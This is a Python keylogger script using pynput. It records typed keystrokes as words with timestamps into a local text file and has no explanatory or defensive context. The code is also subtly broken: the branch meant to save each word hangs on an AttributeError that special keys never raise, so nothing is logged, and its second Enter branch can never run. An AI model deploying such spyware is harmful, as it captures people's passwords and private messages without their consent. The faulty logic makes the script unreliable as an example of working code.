from pynput import keyboard
import time

log_file = 'keystrokes_log.txt'
current_word = ""

def on_key_press(key):
    global current_word
    try:
        if hasattr(key, 'char'):
            current_word += key.char
    except AttributeError:
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            if current_word:
                try:
                    with open(log_file, 'a') as f:
                        f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {current_word}\n')
                except Exception as e:
                    print("Error writing to file:", e)
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                try:
                    with open(log_file, 'a') as f:
                        f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {current_word}\n')
                except Exception as e:
                    print("Error writing to file:", e)
                current_word = ""

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
